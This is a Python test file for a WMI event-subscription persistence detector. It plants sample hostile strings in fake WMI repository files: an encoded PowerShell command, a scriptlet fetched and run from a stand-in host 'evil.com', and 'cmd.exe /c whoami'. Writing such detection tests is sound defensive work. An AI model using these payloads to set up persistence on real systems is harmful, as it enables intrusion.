from __future__ import annotations

from pathlib import Path

from pyrsistencesniper.models.finding import AccessLevel
from pyrsistencesniper.plugins.T1546.wmi_subscriptions import WmiEventSubscription

from .conftest import make_deps


def _make_plugin(tmp_path: Path) -> WmiEventSubscription:
    image, registry, filesystem, profile = make_deps(tmp_path)
    return WmiEventSubscription(
        registry=registry, filesystem=filesystem, image=image, profile=profile
    )


def test_no_objects_data(tmp_path: Path) -> None:
    plugin = _make_plugin(tmp_path)
    assert plugin.run() == []


def test_commandline_utf16_match(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    cmd = "powershell.exe -enc AAAA"
    keyword = "CommandLineTemplate"
    payload = keyword.encode("utf-16-le") + b"\x00\x00" + cmd.encode("utf-16-le")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 100 + payload + b"\x00" * 100)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("powershell" in f.value.lower() for f in findings)
    assert all(f.access_gained == AccessLevel.SYSTEM for f in findings)


def test_scripttext_ascii_match(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)

    script = 'GetObject("script:http://evil.com/payload.sct")'
    payload = b"ScriptText\x00" + script.encode("ascii")
    (repo / "OBJECTS.DATA").write_bytes(b"\x00" * 50 + payload + b"\x00" * 50)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
    assert any("evil.com" in f.value for f in findings)


def test_fs_variant_path(tmp_path: Path) -> None:
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository" / "FS"
    repo.mkdir(parents=True)

    cmd = "cmd.exe /c whoami"
    keyword = "CommandLineTemplate"
    payload = keyword.encode("utf-16-le") + b"\x00\x00" + cmd.encode("utf-16-le")
    (repo / "OBJECTS.DATA").write_bytes(payload)

    plugin = _make_plugin(tmp_path)
    findings = plugin.run()
    assert len(findings) >= 1
